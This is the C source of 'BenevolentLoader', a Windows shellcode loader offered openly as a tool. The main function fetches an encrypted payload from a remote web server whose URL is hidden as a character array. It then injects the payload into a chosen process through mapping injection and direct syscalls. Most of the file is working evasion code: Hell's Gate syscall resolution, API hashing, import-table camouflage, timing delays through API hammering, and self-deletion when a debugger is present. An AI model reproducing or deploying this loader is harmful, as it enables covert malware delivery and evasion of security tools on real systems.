/*
 *  ~ main.c ~
 * BenevolentLoader shellcode loader
 * Author: jakobfriedl
 * Date: June 2024
 *
 * Features (change to + if implemented):
 * + Remote mapping injection via direct syscalls (Hell's Gate)
 * + Download encrypted payload from remote webserver
 * + Brute-force key decryption to decrypt payload
 * ~ No CRT + IAT Camouflage
 * + API hashing
 * + API Hammering
 * + Self-delete when debugged
 * - PPID Spoofing
 *
 */

#include "base.h"

VOID Banner() {
    PRINTW(L"\n\
┳┓          ┓     ┓      ┓    \n\
┣┫┏┓┏┓┏┓┓┏┏┓┃┏┓┏┓╋┃ ┏┓┏┓┏┫┏┓┏┓\n\
┻┛┗ ┛┗┗ ┗┛┗┛┗┗ ┛┗┗┗┛┗┛┗┻┗┻┗ ┛ \n\
          V0.1 by @jakobfriedl\n\n"); 
}

/*
 * Usage:
 *  .\BenevolentLoader.exe <process-name>
 */
int wmain(int argc, wchar_t* argv[]) {
    
    // Get API hashes
    // PrintHashes();
    // return 0;
    
    // Random code
    for (INT i = 0; i < 100; i++) {
        INT k = i + 2;
        INT j = k ^ 3; 
        k += j; 
    }

    Banner(); 

    // Handle command line arguments
    if (argc < 2) {
        WARN_W(L"Usage: %s <process-name>\n", argv[0]); 
        return EXIT_FAILURE; 
    }

    HANDLE hProcess = NULL;
    DWORD dwProcessId = NULL;
    PBYTE pShellcode = NULL; 
    SIZE_T sSize = NULL; 

    /// Initialize Hell's Gate
    VX_TABLE Table = { 0 };

    if (!InitializeHellsGate(&Table)) {
        PRINT_ERROR("InitializeHellsGate");
        return EXIT_FAILURE;
    }
    OKAY("Hell's Gate table initialized.");

    /// IAT Camouflage
    IatCamouflage();
    OKAY("IAT obfuscated with random Windows APIs..."); 

    /// Delay Execution via API Hammering
    // Stress = 1000 => ~ 5 seconds delay
#ifdef VERBOSE
    // Remote GetTickCount64() from IAT if silent mode is enabled
    DWORD T0 = GetTickCount64();
#endif
    if (!ApiHammering(&Table, 1000)) {
        PRINT_ERROR("ApiHammering");
        return EXIT_FAILURE; 
    }
    INFO("Time elapsed: %d", (DWORD)(GetTickCount64() - T0)); 

    /// Check Debugger via NtQueryInformationProcess and self-delete if necessary
    if (DebuggerDetected(&Table)) {
        PRINTA("\n"); 
        INFO("Debugger detected via NtQueryInformationProcess."); 

        if (!SelfDelete(&Table)) {
            PRINT_ERROR("SelfDelete");
            return EXIT_FAILURE; 
        }

        return EXIT_SUCCESS; 
    }
    PRINTA("No debugger detected.\n");

    /// Obtain remote process handle
    if (!GetRemoteProcessHandle(&Table, argv[1], &hProcess, &dwProcessId)) {
        PRINT_ERROR("GetRemoteProcessHandle");
        return EXIT_FAILURE;
    }

    // Check if process has been found
    if (!hProcess || !dwProcessId) {
        WARN_W(L"Process \"%s\" not found.", argv[1]);
        return EXIT_FAILURE; 
    }
    OKAY("[ 0x%p ] [ %d ] Obtained handle to process.", hProcess, dwProcessId);

    /// Download payload 

    // Define the url as an array of characters, in order to not have it show up in the binary
    wchar_t szUrl[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '0', '.', '0', '.', '2', '.', '1', '5', '/', 'e', 'n', 'c', '.', 'b', 'i', 'n', '\0' };

    if (!Download(szUrl, &pShellcode, &sSize)) {
        PRINT_ERROR("Download"); 
        return EXIT_FAILURE; 
    }
    OKAY("[ 0x%p ] %d bytes downloaded.", pShellcode, sSize); 
    PrintByteArray(pShellcode, sSize); 

    /// Injection (includes payload decryption) 
    if (!InvokeMappingInjection(&Table, hProcess, pShellcode, sSize)) {
        PRINT_ERROR("InvokeMappingInjection"); 
        return EXIT_FAILURE; 
    }

    return EXIT_SUCCESS; 
}

/* 
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 */

/// Hell's Gate functions 
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

BOOL GetImageExportDirectory(IN PVOID pModuleBase, OUT PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(IN PVOID pModuleBase, IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, IN PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (HASHA(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            // Quick and dirty fix in case the function has beven hooked
            WORD cw = 0;
            while (TRUE) {
                // check if syscall, in this case we are too far
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // First opcodes should be :
                //    MOV R10, RCX
                //    MOV RCX, <syscall>
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry->wSystemCall = (high << 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    return TRUE;
}

BOOL InitializeHellsGate(IN PVX_TABLE Table) {

    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return FALSE;

    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return FALSE;

    Table->NtQuerySystemInformation.dwHash = NtQuerySystemInformation_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtQuerySystemInformation)) {
        PRINT_ERROR("GetVxTableEntry [NtQuerySystemInformation]");
        return FALSE;
    }

    Table->NtOpenProcess.dwHash = NtOpenProcess_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtOpenProcess)) {
        PRINT_ERROR("GetVxTableEntry [NtOpenProcess]");
        return FALSE;
    }

    Table->NtCreateSection.dwHash = NtCreateSection_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateSection)) {
        PRINT_ERROR("GetVxTableEntry [NtCreateSection]");
        return FALSE;
    }

    Table->NtMapViewOfSection.dwHash = NtMapViewOfSection_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtMapViewOfSection)) {
        PRINT_ERROR("GetVxTableEntry [NtMapViewOfSection]");
        return FALSE;
    }

    Table->NtUnmapViewOfSection.dwHash = NtUnmapViewOfSection_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtUnmapViewOfSection)) {
        PRINT_ERROR("GetVxTableEntry [NtUnmapViewOfSection]");
        return FALSE;
    }

    Table->NtCreateThreadEx.dwHash = NtCreateThreadEx_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateThreadEx)) {
        PRINT_ERROR("GetVxTableEntry [NtCreateThreadEx]");
        return FALSE;
    }

    Table->NtWaitForSingleObject.dwHash = NtWaitForSingleObject_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtWaitForSingleObject)) {
        PRINT_ERROR("GetVxTableEntry [NtWaitForSingleObject]");
        return FALSE;
    }

    Table->NtClose.dwHash = NtClose_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtClose)) {
        PRINT_ERROR("GetVxTableEntry [NtClose]");
        return FALSE;
    }

    Table->NtQueryInformationProcess.dwHash = NtQueryInformationProcess_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtQueryInformationProcess)) {
        PRINT_ERROR("GetVxTableEntry [NtQueryInformationProcess]");
        return FALSE;
    }

    Table->NtCreateFile.dwHash = NtCreateFile_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateFile)) {
        PRINT_ERROR("GetVxTableEntry [NtCreateFile]");
        return FALSE;
    }

    Table->NtReadFile.dwHash = NtReadFile_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtReadFile)) {
        PRINT_ERROR("GetVxTableEntry [NtReadFile]");
        return FALSE;
    }

    Table->NtWriteFile.dwHash = NtWriteFile_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtWriteFile)) {
        PRINT_ERROR("GetVxTableEntry [NtWriteFile]");
        return FALSE;
    }

    Table->NtSetInformationFile.dwHash = NtSetInformationFile_HASH;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtSetInformationFile)) {
        PRINT_ERROR("GetVxTableEntry [NtSetInformationFile]");
        return FALSE;
    }

    return TRUE; 
}